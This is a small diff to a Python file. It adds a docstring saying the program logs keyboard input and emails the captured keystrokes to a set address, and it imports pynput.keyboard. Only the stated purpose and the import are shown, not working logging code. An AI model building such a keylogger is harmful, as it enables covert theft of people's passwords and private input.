@@ -1,4 +1,8 @@
 '''
+This program tracks the keyboard input and then sends the logged input to the specified email.
+'''
+
+'''
 Allows us to monitor and control mouse and keyboard.
 '''
 import pynput.keyboard
